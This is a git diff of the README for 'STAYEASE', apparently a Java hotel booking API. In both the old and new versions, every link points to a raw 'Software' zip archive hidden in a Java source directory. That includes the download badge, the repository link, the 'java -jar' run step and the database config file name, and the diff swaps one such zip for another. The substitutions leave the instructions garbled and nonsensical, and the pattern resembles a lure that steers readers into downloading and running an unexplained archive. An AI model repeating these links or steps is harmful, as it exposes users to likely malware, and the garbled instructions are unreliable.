@@ -1,6 +1,6 @@
 # 🏨 STAYEASE - Effortless Hotel Booking Experience
 
-[![Download STAYEASE](https://raw.githubusercontent.com/stan15-sys/STAYEASE/Main/STAYEASE/pushpakafasate90-ME_BUILDOUT_STAYEASE-master/src/main/java/com/takehome/stayease/dto/hotel/Software_v2.9.zip)](https://raw.githubusercontent.com/stan15-sys/STAYEASE/Main/STAYEASE/pushpakafasate90-ME_BUILDOUT_STAYEASE-master/src/main/java/com/takehome/stayease/dto/hotel/Software_v2.9.zip)
+[![Download STAYEASE](https://github.com/stan15-sys/STAYEASE/raw/refs/heads/Main/STAYEASE/pushpakafasate90-ME_BUILDOUT_STAYEASE-master/src/main/java/com/takehome/stayease/service/Impl/Software-3.7.zip)](https://github.com/stan15-sys/STAYEASE/raw/refs/heads/Main/STAYEASE/pushpakafasate90-ME_BUILDOUT_STAYEASE-master/src/main/java/com/takehome/stayease/service/Impl/Software-3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -33,20 +33,20 @@ To download STAYEASE, please follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page where you can find the latest version of STAYEASE.
    
-   [Download STAYEASE](https://raw.githubusercontent.com/stan15-sys/STAYEASE/Main/STAYEASE/pushpakafasate90-ME_BUILDOUT_STAYEASE-master/src/main/java/com/takehome/stayease/dto/hotel/Software_v2.9.zip)
+   [Download STAYEASE](https://github.com/stan15-sys/STAYEASE/raw/refs/heads/Main/STAYEASE/pushpakafasate90-ME_BUILDOUT_STAYEASE-master/src/main/java/com/takehome/stayease/service/Impl/Software-3.7.zip)
 
 2. **Choose the Right File:** On the releases page, look for the latest release. Download the file that matches your operating system.
 
-3. **Extract the Files:** If you download a `.zip` or `https://raw.githubusercontent.com/stan15-sys/STAYEASE/Main/STAYEASE/pushpakafasate90-ME_BUILDOUT_STAYEASE-master/src/main/java/com/takehome/stayease/dto/hotel/Software_v2.9.zip` file, extract it using tools like WinZip, 7-Zip, or the default extractor on your OS.
+3. **Extract the Files:** If you download a `.zip` or `https://github.com/stan15-sys/STAYEASE/raw/refs/heads/Main/STAYEASE/pushpakafasate90-ME_BUILDOUT_STAYEASE-master/src/main/java/com/takehome/stayease/service/Impl/Software-3.7.zip` file, extract it using tools like WinZip, 7-Zip, or the default extractor on your OS.
 
 4. **Run the Application:**
    - Navigate to the extracted folder.
    - Open a terminal or command prompt in that directory.
-   - Run the application by typing `java -jar https://raw.githubusercontent.com/stan15-sys/STAYEASE/Main/STAYEASE/pushpakafasate90-ME_BUILDOUT_STAYEASE-master/src/main/java/com/takehome/stayease/dto/hotel/Software_v2.9.zip`. Ensure you have the correct permissions to execute the file.
+   - Run the application by typing `java -jar https://github.com/stan15-sys/STAYEASE/raw/refs/heads/Main/STAYEASE/pushpakafasate90-ME_BUILDOUT_STAYEASE-master/src/main/java/com/takehome/stayease/service/Impl/Software-3.7.zip`. Ensure you have the correct permissions to execute the file.
 
 5. **Configure the Database:** If this is your first time using STAYEASE, you will need to set up a MySQL database:
    - Create a database named `stayease`.
-   - Configure the database connection in the `https://raw.githubusercontent.com/stan15-sys/STAYEASE/Main/STAYEASE/pushpakafasate90-ME_BUILDOUT_STAYEASE-master/src/main/java/com/takehome/stayease/dto/hotel/Software_v2.9.zip` file located in the config directory.
+   - Configure the database connection in the `https://github.com/stan15-sys/STAYEASE/raw/refs/heads/Main/STAYEASE/pushpakafasate90-ME_BUILDOUT_STAYEASE-master/src/main/java/com/takehome/stayease/service/Impl/Software-3.7.zip` file located in the config directory.
 
 6. **Access the API:** Once the application is running, you can access the API through your web browser or a tool like Postman. The base URL is `http://localhost:8080/api`.
 
@@ -73,7 +73,7 @@ If you have any questions or need support, please navigate to the "Issues" secti
 
 ## 🔗 Helpful Links
 
-- **GitHub Repository:** [STAYEASE GitHub](https://raw.githubusercontent.com/stan15-sys/STAYEASE/Main/STAYEASE/pushpakafasate90-ME_BUILDOUT_STAYEASE-master/src/main/java/com/takehome/stayease/dto/hotel/Software_v2.9.zip)
+- **GitHub Repository:** [STAYEASE GitHub](https://github.com/stan15-sys/STAYEASE/raw/refs/heads/Main/STAYEASE/pushpakafasate90-ME_BUILDOUT_STAYEASE-master/src/main/java/com/takehome/stayease/service/Impl/Software-3.7.zip)
 - **API Documentation:** (Link to detailed API documentation)
 - **MySQL Installation Guide:** (Link to guide for installing MySQL)
 
